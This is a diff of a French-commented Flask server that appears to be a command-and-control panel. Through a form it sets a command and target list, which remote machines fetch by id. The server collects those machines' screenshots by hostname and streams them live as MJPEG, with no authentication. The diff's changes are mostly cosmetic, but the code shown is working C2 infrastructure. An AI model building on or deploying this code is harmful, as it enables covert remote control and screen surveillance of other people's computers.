@@ -3,7 +3,6 @@ from flask import (
     send_file, redirect, url_for, Response
 )
 import time
-import threading
 
 app = Flask(__name__)
 
@@ -14,7 +13,7 @@ destinataires = ""
 mode = "cmd"        # "cmd" ou "live"
 last_host = ""      # hostname du dernier screenshot reçu
 
-# Template HTML
+# Nouveau template HTML
 html_page = """
 <!DOCTYPE html>
 <html>
@@ -76,8 +75,21 @@ html_page = """
   <div class="section">
     <h2>Live Screen</h2>
     <p><strong>Hostname :</strong> {{ last_host or "(aucun)" }}</p>
-    <!-- MJPEG Stream -->
-    <img id="stream" src="/mjpeg" alt="Live screen">
+
+    <!-- Conteneur vide, on y injecte le <img> ensuite -->
+    <div id="stream-container"></div>
+
+    <script>
+      // Une fois la page chargée, on crée l'<img> qui pointera sur /mjpeg
+      document.addEventListener('DOMContentLoaded', function(){
+        var div = document.getElementById('stream-container');
+        var img = document.createElement('img');
+        img.id = 'stream';
+        img.alt = 'Live screen';
+        img.src = '/mjpeg';
+        div.appendChild(img);
+      });
+    </script>
   </div>
   {% endif %}
 </body>
@@ -88,8 +100,8 @@ html_page = """
 def index():
     global commande, destinataires
     if request.method == "POST":
-        commande = request.form.get("commande", "").strip()
-        destinataires = request.form.get("destinataires", "").strip()
+        commande = request.form.get("commande","").strip()
+        destinataires = request.form.get("destinataires","").strip()
     return render_template_string(
         html_page,
         commande=commande,
@@ -102,8 +114,8 @@ def index():
 @app.route("/set_mode", methods=["POST"])
 def set_mode():
     global mode
-    m = request.form.get("mode", "")
-    if m in ("live", "cmd"):
+    m = request.form.get("mode","")
+    if m in ("live","cmd"):
         mode = m
     return redirect(url_for("index"))
 
@@ -117,7 +129,6 @@ def get_commande():
     mid = request.args.get('id','')
     if not mid:
         return "", 400
-
     if destinataires == "*":
         return commande
     elif destinataires.startswith("!"):
@@ -159,22 +170,18 @@ def screen_png():
     except FileNotFoundError:
         return "", 404
 
-# --- Nouveau : endpoint MJPEG ---
 def mjpeg_generator():
-    """Génère un flux multipart/x-mixed-replace à partir de latest.png"""
     boundary = b"--frame"
     while True:
         try:
-            with open("latest.png", "rb") as img:
+            with open("latest.png","rb") as img:
                 frame = img.read()
             yield boundary + b"\r\n" + \
                   b"Content-Type: image/png\r\n\r\n" + \
                   frame + b"\r\n"
         except FileNotFoundError:
-            # pas encore d'image, on attend un peu
             time.sleep(0.1)
             continue
-        # on peut ajuster ce délai si besoin
         time.sleep(0.1)
 
 @app.route("/mjpeg")
@@ -185,5 +192,4 @@ def mjpeg():
     )
 
 if __name__ == "__main__":
-    # Lance le serveur
     app.run(host="0.0.0.0", port=5000, threaded=True)
